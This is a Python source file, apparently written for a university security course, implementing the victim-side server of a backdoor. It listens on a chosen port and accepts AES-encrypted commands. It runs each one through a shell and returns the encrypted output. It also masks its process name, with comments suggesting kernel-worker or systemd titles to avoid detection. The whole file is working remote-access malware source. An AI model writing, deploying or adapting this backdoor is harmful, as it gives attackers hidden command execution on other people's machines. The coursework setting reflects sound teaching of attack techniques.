#!/usr/bin/python
'''
COMP 8505 - Assignment 3
Backdoor - Server (Victim) by Jeffrey Sasaki

The server program will execute a command given by the client (attacker) and
outputs the response back to the client.
'''
from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import subprocess
import optparse
import sys
import setproctitle

# masquerade process title
# NOTE: generally a backdoor would not be named "backdoor" a recommended process
# title would be something like "[kworker/0:0H]" or
# "/usr/bin/systemd/systemd-login"
title = "backdoor"
setproctitle.setproctitle(title)

# encrypt/encode and decrypt/decode a string
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# random secret key (both the client and server must match this key)
secret = "sixteen byte key"
iv = Random.new().read(AES.block_size)

# create cipher object
cipher = AES.new(secret, AES.MODE_CFB, iv)

# parse command line argument
# generally any output would be concealed on the server (victim's) side
parser = optparse.OptionParser("usage: python server.py -p <port>")
parser.add_option('-p', dest='port', type = 'int', help = 'port')
(options, args) = parser.parse_args()
if (options.port == None):
	print parser.usage
	sys.exit()
else:
	port = options.port

# listen for client
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', port))
c.listen(1)
s, a = c.accept()
s.send(EncodeAES(cipher, 'You are connected' + secret))

while True:
	data = s.recv(1024)

	# decrypt data
	decrypted = DecodeAES(cipher, data)
	
	# check for "exit" by the attacker
	if decrypted == "exit":
		break    	

	# execute command
	proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdoutput = proc.stdout.read() + proc.stderr.read() + secret

	# encrypt output
	encrypted = EncodeAES(cipher, stdoutput)

	# send encrypted output
	s.send(encrypted)
s.close()
sys.exit()
